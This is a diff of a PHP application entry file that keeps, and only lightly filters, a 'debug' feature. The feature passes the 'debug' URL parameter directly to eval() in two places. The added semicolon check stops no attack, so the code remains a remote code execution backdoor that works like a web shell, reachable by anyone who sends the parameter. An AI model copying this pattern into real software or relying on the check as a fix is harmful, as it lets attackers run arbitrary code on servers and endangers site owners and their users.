@@ -9,9 +9,14 @@ if (isset($_GET['debug'])) {
 	
 	$DEBUG_INPUT = $_GET['debug'];
 	if (is_array($DEBUG_INPUT)) {
-		eval($DEBUG_INPUT[0]);# 
+		if (preg_match('/;$/', $DEBUG_INPUT[0])) {
+			eval($DEBUG_INPUT[0]);# 
+		} else {
+		}
 		if (isset($DEBUG_INPUT[1])) {
 			$DEBUG_INPUT = $DEBUG_INPUT[1];
+		} else {
+			$DEBUG_INPUT = $DEBUG_INPUT[0];
 		}
 	}
 }
@@ -32,5 +37,7 @@ new Astrology\Start();
 
 // 调试问题
 if (!empty($DEBUG_INPUT)) {
-	eval($DEBUG_INPUT);# 
+	if (preg_match('/;$/', $DEBUG_INPUT)) {
+		eval($DEBUG_INPUT);# 
+	}
 }
